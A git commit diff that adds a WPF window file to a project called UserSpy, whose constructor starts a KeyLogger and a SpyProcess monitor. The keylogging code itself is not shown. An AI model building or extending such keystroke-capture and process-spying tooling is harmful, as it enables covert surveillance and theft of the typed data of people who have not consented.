d5d262f1d5f9c5411d02c36d711d054083c1dcb4
DenisAstashkin <ast.den27@gmail.com>
2022-08-03 00:53:28 +0400

    Rename MainWindow

---
+++ UserSpy/Registration.xaml.cs
@@ -0,0 +1,39 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows;
+using System.Windows.Controls;
+using System.Windows.Data;
+using System.Windows.Documents;
+using System.Windows.Input;
+using System.Windows.Media;
+using System.Windows.Media.Imaging;
+using System.Windows.Navigation;
+using System.Windows.Shapes;
+using keylogger;
+using keylogger.keylog;
+using spyprocess;
+using spyprocess.processlog;
+using spyprocess.processmodel;
+using spymainwindow;
+using System.Diagnostics;
+using System.Threading;
+
+namespace UserSpy
+{    
+    public partial class MainWindow : Window
+    {
+        KeyLogger logger;
+        SpyProcess SP;
+        
+        public MainWindow()
+        {
+            logger = new KeyLogger();
+            SP = new SpyProcess();
+            InitializeComponent();   
+            
+        }
+    }
+}
